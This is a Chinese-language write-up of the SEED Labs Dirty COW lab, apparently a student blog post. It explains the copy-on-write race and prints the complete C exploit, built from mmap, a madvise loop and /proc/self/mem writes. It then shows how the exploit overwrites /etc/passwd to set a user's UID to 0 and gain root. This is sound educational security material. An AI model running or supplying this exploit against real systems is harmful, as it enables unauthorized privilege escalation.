---
title: Dirty-COW-Attack-Lab
categories:
  - SeedLabs/SoftwareSecurity
tags:
  - Dirty-COW
abbrlink: 958ee7cd
date: 2022-11-14 14:11:35
---

## Lab environment

这个实验，我们需要一个古旧的 `linux` 发行版，或许自己安装内核也行。这里我选择的是 `SeedLab` 提供的 `ubuntu12.04`，具体环境如下：

![image-20221114122900447](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221114122900447.png)

然后下载 `Labsetup.zip` 文件即可。

## 代码分析

这里我们主要用三个线程，我们先看主线程。首先，以只读方式读取文件，这是在权限之内的。之后调用 `fstat` 得到文件的一些信息，再通过 `mmap` 把文件映射到自己的内存空间。

这种映射的作用就是，可以通过对内存的读写来实现对文件的读写，也就是说这一片内存空间，其实就是对于这个文件。进程间使用文件来通信使用的就是这种方式，一个文件映射到一块物理内存上，多个进程都有虚拟内存来对应这一块物理内存。这样每个进程对自己虚拟内存的修改会体现在物理内存上，其他进程就能够拿到这个修改的数据。

我们看这里第三个参数指定是 `PROT_READ`，表示进程对这个映射只读。

对于第四个参数，如果是 `MAP_SHAREED`，表示这个一个共享映射，进程之间共用物理空间；如果是 `MAP_PRIVATE`，就是将文件映射到调用进程的私有内存空间里，对底层文件和其他进程不可见。为了创建私有内存，需要将原始内存拷贝一份，而这个拷贝过程一般都是写时拷贝。

```c
int main(int argc, char *argv[])
{
    pthread_t pth1, pth2;
    struct stat st;
    int file_size;

    // Open the target file in the read-only mode.
    int f = open("/zzz", O_RDONLY);

    // Map the file to COW memory using MAP_PRIVATE.
    fstat(f, &st);
    file_size = st.st_size;
    map = mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);

    // Find the position of the target area
    char *position = strstr(map, "222222");

    // We have to do the attack using two threads.
    pthread_create(&pth1, NULL, madviseThread, (void *)file_size);
    pthread_create(&pth2, NULL, writeThread, position);

    // Wait for the threads to finish.
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);
    return 0;
}
```

接下来我们看第一个子线程，这个线程的作用就是告诉内核，不需要这个私有拷贝了，退回到共享内存。

```c
void *madviseThread(void *arg)
{
    int file_size = (int)arg;
    while (1)
    {
        madvise(map, file_size, MADV_DONTNEED);
    }
}
```

第二个子线程，这个线程就是修改自己的这份私有拷贝。（因为是私有内存，所以可以写入），这个 `write` 因为写时拷贝的存在，会先对内存做一份拷贝，然后更新页表，让虚拟内存指向指向新创建的物理内存，然后再调用 `write` 写入内存。如果在执行完了第一第二步之后，调用了 `madvise` 宣布放弃这个内存，再来 `write` 就出错了，写到了最初的映射内存里面。（调用 `write` 已经检查过权限了，发现是写时拷贝，于是就开始了，这就导致第三步时不会再执行

```c
void *writeThread(void *arg)
{
    char *content = "******";
    off_t offset = (off_t)arg;

    int f = open("/proc/self/mem", O_RDWR);
    while (1)
    {
        // Move the file pointer to the corresponding position.
        lseek(f, offset, SEEK_SET);
        // Write to the memory.
        write(f, content, strlen(content));
    }
}
```

## Task 1: Modify a Dummy Read-Only File

我们新建一个普通用户只读的文件，只有 `root` 用户可以写，在执行我们的攻击程序之后，可以看到，我们成功的修改了这个文件。

![image-20221114121345868](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221114121345868.png)

## Task 2: Modify the Password File to Gain the Root Privilege

首先，使用 `sudo adduser ceyewan` 创建一个新用户，然后查看 `/etc/passwd` 文件，可以看到并不是 root 用户，然后修改我们的攻击代码，将打开的文件替换为密码文件，`int f=open("/etc/passwd", O_RDONLY);`；然后查找 `ceyewan` 的位置，`char *position = strstr(map, "ceyewan");`；最后，写入数据，把第三和第四个值修改为 0，但是为了保证长度不变，我们修改为 0000，` char *content= "ceyewan:x:0000:0000:,,,:/home/ceyewan:/bin/bash";`。其他部分不变，重新编译执行，几秒钟后，查看 `passwd` 文件，发现变成了 `root` 用户，登录后，确实得到 root 权限，提权成功。

![image-20221114122628537](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221114122628537.png)
